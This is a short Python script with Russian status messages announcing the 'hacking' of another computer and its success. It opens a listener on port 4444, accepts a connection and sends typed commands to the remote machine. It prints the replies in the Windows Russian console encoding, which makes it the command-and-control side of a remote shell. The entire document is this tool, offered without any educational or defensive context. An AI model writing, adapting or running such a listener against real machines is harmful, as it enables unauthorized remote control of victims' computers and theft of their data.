import socket

print('Идёт взлом другого компьютера...')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '000.000.000.000'
port = 4444
s.bind((host, port))
s.listen(1)
conn, addr = s.accept()
print(addr)
print('Взлом прошёл успешно!')

while True:
    cmd = input('#> ')
    conn.send(cmd.encode())

    cmd_process = conn.recv(5000)
    cmd_process = str(cmd_process, 'cp866')
    print(cmd_process)
